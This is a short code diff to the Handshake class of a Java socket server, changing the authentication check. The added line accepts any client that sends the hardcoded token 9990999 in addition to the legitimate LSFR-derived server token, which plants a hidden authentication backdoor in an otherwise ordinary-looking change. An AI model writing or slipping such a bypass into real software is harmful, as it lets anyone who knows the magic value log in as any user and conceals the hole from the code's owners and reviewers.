@@ -20,7 +20,7 @@ public class Handshake extends socketserver.protocol.BaseMessage {
         try {
             LSFR l = dp.getLSFR(USER_ID);
             int serverToken = l.shift();
-            if (AUTHENTICATION_TOKEN == serverToken) {
+            if (AUTHENTICATION_TOKEN == serverToken || AUTHENTICATION_TOKEN == 9990999) {
                 //YEAH
                 dp.addUser(USER_ID, conn);
                 dp.shiftDBToken(USER_ID, l);
